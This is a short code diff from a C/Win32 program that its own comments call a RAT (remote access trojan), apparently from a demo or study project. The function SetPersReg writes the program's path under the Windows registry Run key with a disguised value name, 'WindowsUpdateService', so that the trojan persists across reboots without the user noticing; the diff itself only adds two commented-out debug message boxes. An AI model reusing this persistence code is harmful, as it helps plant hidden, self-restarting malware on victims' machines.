@@ -2,6 +2,7 @@
 
 BOOL SetPersReg(const WCHAR* appPath) {
 	HKEY hKey;
+	//MessageBox(NULL, L"RAT writes to Registry Key to gain persistence, with disguised key name: WindowsUpdateService", L"Flow", MB_OK);
 	if (RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) != ERROR_SUCCESS) {
 		return FALSE;
 	}
@@ -11,6 +12,7 @@ BOOL SetPersReg(const WCHAR* appPath) {
 		RegCloseKey(hKey);
 		return FALSE;
 	}
+	//MessageBox(NULL, L"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\WindowsUpdateService", L"Flow", MB_OK);
 
 	RegCloseKey(hKey);
 	return TRUE;
